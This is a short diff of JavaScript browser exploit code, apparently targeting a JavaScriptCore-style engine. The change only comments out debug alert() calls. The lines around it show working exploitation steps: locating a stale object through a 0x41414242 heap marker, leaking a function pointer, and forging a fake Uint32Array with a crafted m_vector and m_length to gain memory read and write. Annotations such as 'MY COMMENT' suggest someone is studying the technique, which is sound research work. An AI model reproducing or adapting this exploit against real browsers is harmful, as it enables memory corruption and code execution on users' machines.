@@ -197,12 +197,12 @@ function dgc() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
  			if (bufs[i][k] == 0x41414242) { 
-				alert("Found the object!!");
+				//alert("Found the object!!");
 				
  				// Leak function pointer
 				stale[0] = fc;
  				fcp = bufs[i][k];
-				alert("Leaked function pointer:" + fcp)
+				//alert("Leaked function pointer:" + fcp)
 				
 				// Make a fake Uint32Array
  				stale[0] = {
@@ -219,11 +219,11 @@ function dgc() {
  					'c': smsh,		// void* m_vector
  					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
-				alert("Created fake obj in stale[0]");
+				//alert("Created fake obj in stale[0]");
 
 				// Why do this? VVV
  				stale[1] = stale[0]
-				alert("set stale[1] = stale[0]");
+				//alert("set stale[1] = stale[0]");
 				
 				// ORIGINAL COMMENT: misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
 				// MY COMMENT: Offset by 16 bytes to get past the JSCell inheirited fields.
